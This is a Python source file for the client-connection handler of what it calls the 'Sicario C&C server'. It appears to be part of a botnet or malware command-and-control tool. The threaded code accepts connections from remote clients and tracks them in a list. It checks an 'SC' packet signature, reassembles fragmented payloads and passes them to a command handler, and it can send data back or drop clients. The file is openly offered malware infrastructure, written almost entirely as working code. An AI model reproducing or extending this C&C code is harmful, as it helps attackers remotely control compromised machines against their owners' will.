#!/usr/bin/python

import sicario
import log
import commands
import client

# Sicario C&C server 
# Client class

from threading import Thread

clients = []

class Client (Thread):
	def __init__ (self, sock, sema):
		super(Client, self).__init__()
		self.sock = sock
		self.sock.settimeout(10)
		self.sema = sema
		self.connection = True
		self.packets_incoming = 0
		self.buffer = ''
		
	def run (self):
		clients.append(self)
		log.log('{} connected! (socket level) ({} clients now)'.format(self.sock.getpeername()[0], len(clients)))

		highClient = client.Client(self.sock.getpeername()[0], self)

		while self.connection == True:
			data = self.sock.recv(2048).strip('\n')
			print(data)
			if not data: 
				clients.remove(self)
				log.log('{} disconnected! (socket level) ({} clients left)'.format(self.sock.getpeername()[0], len(clients)))
				self.sock.close()
				break

			# Sicario packet looks like this: SCXX(actual data), where SC is signature and XX number of incoming packets (usually 00, unless you're sending something big)

			if data[:2] != 'SC': # invalid signature
				clients.remove(self)
				log.log('{} disconnected! (socket level, invalid packet signature) ({} clients left)'.format(self.sock.getpeername()[0], len(clients)))
				self.sock.close()

			if data[2:4] != '00': # more packets incoming
				self.packets_incoming = int(float(data[2:4]))
				self.buffer += data[5:-1]

				if self.packets_incoming == 1: # this was the last packet
					self.packets_incoming = 0
					highClient.on_command(self.buffer)
					self.buffer = ''
					print('received')
			else:
				highClient.on_command(data[5:-1])

	def send(self, arg):
		self.sock.send(arg)
		
	def stop(self):
		log.log('{} got disconnected by server! ({} clients now)'.format(self.sock.getpeername()[0], len(clients)-1))
		self.connection = False
		self.sock.close()
		clients.remove(self)
